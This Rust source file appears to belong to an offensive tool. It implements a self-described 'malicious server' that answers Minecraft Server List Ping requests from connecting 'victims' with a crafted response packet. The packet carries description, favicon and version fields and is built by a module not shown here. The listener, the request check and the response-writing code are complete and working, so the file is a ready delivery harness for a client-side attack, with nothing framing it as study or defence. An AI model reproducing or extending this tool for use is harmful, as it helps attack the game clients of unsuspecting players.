use std::error::Error;

use crate::packet::{build_packet, to_varint};

use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::{TcpListener, TcpStream},
};

/// Malicious server
pub struct Server {
    host: String,
    port: u16,
    protocol: isize,
    description: String,
    favicon: String,
    version: String,
}

impl Server {
    pub fn new(
        host: &str,
        port: u16,
        protocol: isize,
        description: &str,
        favicon: &str,
        version: &str,
    ) -> Self {
        Self {
            host: String::from(host),
            port,
            protocol,
            description: String::from(description),
            favicon: String::from(favicon),
            version: String::from(version),
        }
    }

    /// Read a varint value from a TcpStream
    async fn read_varint_from_socket(
        &mut self,
        stream: &mut TcpStream,
    ) -> Result<usize, Box<dyn std::error::Error>> {
        let mut read = 0;
        let mut output = 0;

        loop {
            let read_value = stream.read_u8().await?;

            let value = read_value & 0b0111_1111;

            output |= (value as usize) << (7 * read);

            read += 1;

            if read > 5 {
                panic!(); // varint size should be 5
            }

            if (read_value & 0b1000_0000) == 0 {
                return Ok(output);
            }
        }
    }

    /// Handle new victim
    async fn handle(&mut self, stream: &mut TcpStream) -> Result<(), Box<dyn Error>> {
        let mut incoming_packet = vec![0; self.read_varint_from_socket(stream).await?];

        stream.read_exact(&mut incoming_packet).await?;

        // Any SLP request packet should start with 0x00 and end with 0x1
        if (
            incoming_packet.first().unwrap(), // Packet ID
            incoming_packet.last().unwrap(),  // Next state
        ) != (&0x0, &0x1)
        {
            println!("[-] Received packet was apparently not a SLP packet.");
            return Ok(());
        }

        let packet = build_packet(
            self.protocol,
            &self.description,
            &self.version,
            &self.favicon,
        )
        .await?;

        println!("[~] Sending reponse packet ({} bytes)...", packet.len());

        // Packet length
        stream
            .write_all(to_varint(packet.len())?.as_slice())
            .await?;

        // Packet
        stream.write_all(packet.as_slice()).await?;

        println!("[+] Response packet written.");

        Ok(())
    }

    /// Run the server
    pub async fn run(&mut self) -> Result<(), Box<dyn Error>> {
        let addr = format!("{}:{}", self.host, self.port);
        let listener = TcpListener::bind(&addr).await?;

        println!("[~] Server is listening on `{}`...", addr);

        loop {
            match listener.accept().await {
                Ok((mut stream, address)) => {
                    println!("[+] Handling new client: `{}`", address);
                    self.handle(&mut stream).await?
                }
                Err(e) => panic!("[-] Failed to handle client: `{}`", e),
            }
        }
    }
}
